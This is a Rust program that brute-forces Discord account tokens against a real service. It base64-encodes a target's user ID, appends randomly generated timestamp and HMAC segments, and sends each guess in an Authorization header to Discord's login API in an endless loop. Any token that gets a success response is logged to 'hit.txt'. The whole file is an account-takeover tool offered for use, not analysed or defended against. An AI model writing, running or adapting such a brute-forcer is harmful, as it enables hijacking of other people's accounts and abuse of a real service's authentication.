use base64;
use rand::seq::SliceRandom;
use rand::thread_rng;
use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION};
use reqwest::Client;
use std::fs::OpenOptions;
use std::io::{self, BufRead, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

#[tokio::main]
async fn main() {
    let mut id_to_token = String::new();
    println!("User ID: ");
    io::stdin()
        .lock()
        .read_line(&mut id_to_token)
        .expect("Failed to read input");
    let encoded_user_id = base64::encode(id_to_token.trim().as_bytes());

    // AtomicBool to track Ctrl+C signal
    let running = Arc::new(AtomicBool::new(true));
    let running_handle = running.clone();

    // Set up Ctrl+C handler
    ctrlc::set_handler(move || {
        running_handle.store(false, Ordering::SeqCst);
    })
    .expect("Error setting Ctrl+C handler");

    while running.load(Ordering::SeqCst) {
        let timestamp = generate_random_string(6);
        let hmac = generate_random_string(27);

        let token = format!("{}.{}.{}", encoded_user_id, timestamp, hmac);
        let client = Client::new();
        let login_url = "https://discordapp.com/api/v9/auth/login";
        let mut headers = HeaderMap::new();
        headers.insert(AUTHORIZATION, HeaderValue::from_str(&token).unwrap());

        let login = client.get(login_url).headers(headers).send().await;

        match login {
            Ok(response) => {
                println!("Status code: {}", response.status());
                if response.status().is_success() {
                    println!("\x1b[32m[+] VALID {}\x1b[0m", token);
                    let mut f = OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open("hit.txt")
                        .expect("Failed to open file");
                    writeln!(f, "{}", token).expect("Failed to write to file");
                } else {
                    println!("\x1b[31m[-] INVALID {}\x1b[0m", token);
                }
            }
            Err(_) => {
                println!("\x1b[31m[-] ERROR {}\x1b[0m", token);
            }
        }
        println!("");
    }
}

fn generate_random_string(length: usize) -> String {
    let mut rng = thread_rng();
    let characters: Vec<char> = (0..26)
        .map(|i| (i + b'a') as char)
        .chain((0..26).map(|i| (i + b'A') as char))
        .chain((0..10).map(|i| (i + b'0') as char))
        .chain(vec!['-', '_'])
        .collect();
    (0..length)
        .map(|_| characters.choose(&mut rng).unwrap())
        .collect()
}
